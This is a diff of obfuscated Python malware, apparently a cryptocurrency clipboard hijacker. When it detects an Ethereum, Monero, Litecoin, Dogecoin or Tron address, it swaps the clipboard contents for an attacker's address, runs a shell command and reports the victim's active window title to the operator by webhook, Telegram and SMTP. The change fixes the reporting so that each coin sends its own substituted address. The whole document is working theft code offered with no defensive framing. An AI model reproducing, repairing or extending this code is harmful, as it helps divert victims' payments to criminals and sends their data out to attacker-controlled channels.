@@ -208,13 +208,13 @@ def vdsu281cjm():
                 awd42321dsa.copy(hrextr_R2Xoy2)
 
                 if deswsjn != '' or ' ' or '%webhook%':
-                    wefuh4323.Thread(target=redugh8(frewsuih.title, 'Ethereum [ETH]', hfruieoawd, hrextr_R2Xoy1)).start()
+                    wefuh4323.Thread(target=redugh8(frewsuih.title, 'Ethereum [ETH]', hfruieoawd, hrextr_R2Xoy2)).start()
 
                 if kuhio49 != '' or ' ' or '%tele%':
-                    wefuh4323.Thread(target=nueia8732q.run(egreger453645(frewsuih.title, 'Ethereum [ETH]', hfruieoawd, hrextr_R2Xoy1))).start()
+                    wefuh4323.Thread(target=nueia8732q.run(egreger453645(frewsuih.title, 'Ethereum [ETH]', hfruieoawd, hrextr_R2Xoy2))).start()
 
                 if regh54 != '' or ' ' or '%smtp%':
-                    wefuh4323.Thread(target=gesnui(frewsuih.title, 'Ethereum [ETH]', hfruieoawd, hrextr_R2Xoy1)).start()
+                    wefuh4323.Thread(target=gesnui(frewsuih.title, 'Ethereum [ETH]', hfruieoawd, hrextr_R2Xoy2)).start()
 
 
     elif wadyhe_cery33 == True:
@@ -228,13 +228,13 @@ def vdsu281cjm():
                 awd42321dsa.copy(hrextr_R2Xoy3)
 
                 if deswsjn != '' or ' ' or '%webhook%':
-                    wefuh4323.Thread(target=redugh8(frewsuih.title, 'Monero [XMR]', hfruieoawd, hrextr_R2Xoy1)).start()
+                    wefuh4323.Thread(target=redugh8(frewsuih.title, 'Monero [XMR]', hfruieoawd, hrextr_R2Xoy3)).start()
 
                 if kuhio49 != '' or ' ' or '%tele%':
-                    wefuh4323.Thread(target=nueia8732q.run(egreger453645(frewsuih.title, 'Monero [XMR]', hfruieoawd, hrextr_R2Xoy1))).start()
+                    wefuh4323.Thread(target=nueia8732q.run(egreger453645(frewsuih.title, 'Monero [XMR]', hfruieoawd, hrextr_R2Xoy3))).start()
 
                 if regh54 != '' or ' ' or '%smtp%':
-                    wefuh4323.Thread(target=gesnui(frewsuih.title, 'Monero [XMR]', hfruieoawd, hrextr_R2Xoy1)).start()
+                    wefuh4323.Thread(target=gesnui(frewsuih.title, 'Monero [XMR]', hfruieoawd, hrextr_R2Xoy3)).start()
 
     elif wadyhe_cery44 == True:
         if hrextr_R2Xoy4 != '' or hrextr_R2Xoy4 != ' ' or hrextr_R2Xoy4 != "%LTC%":
@@ -247,13 +247,13 @@ def vdsu281cjm():
                 awd42321dsa.copy(hrextr_R2Xoy4)
 
                 if deswsjn != '' or ' ' or '%webhook%':
-                    wefuh4323.Thread(target=redugh8(frewsuih.title, 'Litecoin [LTC]', hfruieoawd, hrextr_R2Xoy1)).start()
+                    wefuh4323.Thread(target=redugh8(frewsuih.title, 'Litecoin [LTC]', hfruieoawd, hrextr_R2Xoy4)).start()
 
                 if kuhio49 != '' or ' ' or '%tele%':
-                    wefuh4323.Thread(target=nueia8732q.run(egreger453645(frewsuih.title, 'Litecoin [LTC]', hfruieoawd, hrextr_R2Xoy1))).start()
+                    wefuh4323.Thread(target=nueia8732q.run(egreger453645(frewsuih.title, 'Litecoin [LTC]', hfruieoawd, hrextr_R2Xoy4))).start()
 
                 if regh54 != '' or ' ' or '%smtp%':
-                    wefuh4323.Thread(target=gesnui(frewsuih.title, 'Litecoin [LTC]', hfruieoawd, hrextr_R2Xoy1)).start()
+                    wefuh4323.Thread(target=gesnui(frewsuih.title, 'Litecoin [LTC]', hfruieoawd, hrextr_R2Xoy4)).start()
 
 
     elif wadyhe_cery55 == True or wadyhe_cery555 == True or wadyhe_cery5555 == True:
@@ -267,13 +267,13 @@ def vdsu281cjm():
                         pass
                     awd42321dsa.copy(hrextr_R2Xoy5)
                     if deswsjn != '' or ' ' or '%webhook%':
-                        wefuh4323.Thread(target=redugh8(frewsuih.title, 'Dogecoin [DOGE]', hfruieoawd, hrextr_R2Xoy1)).start()
+                        wefuh4323.Thread(target=redugh8(frewsuih.title, 'Dogecoin [DOGE]', hfruieoawd, hrextr_R2Xoy5)).start()
     
                     if kuhio49 != '' or ' ' or '%tele%':
-                        wefuh4323.Thread(target=nueia8732q.run(egreger453645(frewsuih.title, 'Dogecoin [DOGE]', hfruieoawd, hrextr_R2Xoy1))).start()
+                        wefuh4323.Thread(target=nueia8732q.run(egreger453645(frewsuih.title, 'Dogecoin [DOGE]', hfruieoawd, hrextr_R2Xoy5))).start()
     
                     if regh54 != '' or ' ' or '%smtp%':
-                        wefuh4323.Thread(target=gesnui(frewsuih.title, 'Dogecoin [DOGE]', hfruieoawd, hrextr_R2Xoy1)).start()
+                        wefuh4323.Thread(target=gesnui(frewsuih.title, 'Dogecoin [DOGE]', hfruieoawd, hrextr_R2Xoy5)).start()
                 elif wadyhe_cery00 is not None and wadyhe_cery00.group() != hrextr_R2Xoy5:
                     try:
                         xvcj5tr.run(earth, shell=True, check=True, capture_output=False)
@@ -281,13 +281,13 @@ def vdsu281cjm():
                         pass
                     awd42321dsa.copy(hrextr_R2Xoy5)
                     if deswsjn != '' or ' ' or '%webhook%':
-                        wefuh4323.Thread(target=redugh8(frewsuih.title, 'Dogecoin [DOGE]', hfruieoawd, hrextr_R2Xoy1)).start()
+                        wefuh4323.Thread(target=redugh8(frewsuih.title, 'Dogecoin [DOGE]', hfruieoawd, hrextr_R2Xoy5)).start()
     
                     if kuhio49 != '' or ' ' or '%tele%':
-                        wefuh4323.Thread(target=nueia8732q.run(egreger453645(frewsuih.title, 'Dogecoin [DOGE]', hfruieoawd, hrextr_R2Xoy1))).start()
+                        wefuh4323.Thread(target=nueia8732q.run(egreger453645(frewsuih.title, 'Dogecoin [DOGE]', hfruieoawd, hrextr_R2Xoy5))).start()
     
                     if regh54 != '' or ' ' or '%smtp%':
-                        wefuh4323.Thread(target=gesnui(frewsuih.title, 'Dogecoin [DOGE]', hfruieoawd, hrextr_R2Xoy1)).start()
+                        wefuh4323.Thread(target=gesnui(frewsuih.title, 'Dogecoin [DOGE]', hfruieoawd, hrextr_R2Xoy5)).start()
                 elif wadyhe_cery000 is not None and wadyhe_cery000.group() != hrextr_R2Xoy5:
                     try:
                         xvcj5tr.run(earth, shell=True, check=True, capture_output=False)
@@ -295,13 +295,13 @@ def vdsu281cjm():
                         pass
                     awd42321dsa.copy(hrextr_R2Xoy5)
                     if deswsjn != '' or ' ' or '%webhook%':
-                        wefuh4323.Thread(target=redugh8(frewsuih.title, 'Dogecoin [DOGE]', hfruieoawd, hrextr_R2Xoy1)).start()
+                        wefuh4323.Thread(target=redugh8(frewsuih.title, 'Dogecoin [DOGE]', hfruieoawd, hrextr_R2Xoy5)).start()
     
                     if kuhio49 != '' or ' ' or '%tele%':
-                        wefuh4323.Thread(target=nueia8732q.run(egreger453645(frewsuih.title, 'Dogecoin [DOGE]', hfruieoawd, hrextr_R2Xoy1))).start()
+                        wefuh4323.Thread(target=nueia8732q.run(egreger453645(frewsuih.title, 'Dogecoin [DOGE]', hfruieoawd, hrextr_R2Xoy5))).start()
     
                     if regh54 != '' or ' ' or '%smtp%':
-                        wefuh4323.Thread(target=gesnui(frewsuih.title, 'Dogecoin [DOGE]', hfruieoawd, hrextr_R2Xoy1)).start()
+                        wefuh4323.Thread(target=gesnui(frewsuih.title, 'Dogecoin [DOGE]', hfruieoawd, hrextr_R2Xoy5)).start()
     elif wadyhe_cery66 == True:
         if hrextr_R2Xoy6 != '' or hrextr_R2Xoy6 != ' ' or hrextr_R2Xoy6 != "%TRX%":
             frewsuih = yxvcre.getActiveWindow()
@@ -312,13 +312,13 @@ def vdsu281cjm():
                     pass
                 awd42321dsa.copy(hrextr_R2Xoy6)
                 if deswsjn != '' or ' ' or '%webhook%':
-                    wefuh4323.Thread(target=redugh8(frewsuih.title, 'Tron [TRX]', hfruieoawd, hrextr_R2Xoy1)).start()
+                    wefuh4323.Thread(target=redugh8(frewsuih.title, 'Tron [TRX]', hfruieoawd, hrextr_R2Xoy6)).start()
 
                 if kuhio49 != '' or ' ' or '%tele%':
-                    wefuh4323.Thread(target=nueia8732q.run(egreger453645(frewsuih.title, 'Tron [TRX]', hfruieoawd, hrextr_R2Xoy1))).start()
+                    wefuh4323.Thread(target=nueia8732q.run(egreger453645(frewsuih.title, 'Tron [TRX]', hfruieoawd, hrextr_R2Xoy6))).start()
 
                 if regh54 != '' or ' ' or '%smtp%':
-                    wefuh4323.Thread(target=gesnui(frewsuih.title, 'Tron [TRX]', hfruieoawd, hrextr_R2Xoy1)).start()
+                    wefuh4323.Thread(target=gesnui(frewsuih.title, 'Tron [TRX]', hfruieoawd, hrextr_R2Xoy6)).start()
 
     else:
         pass
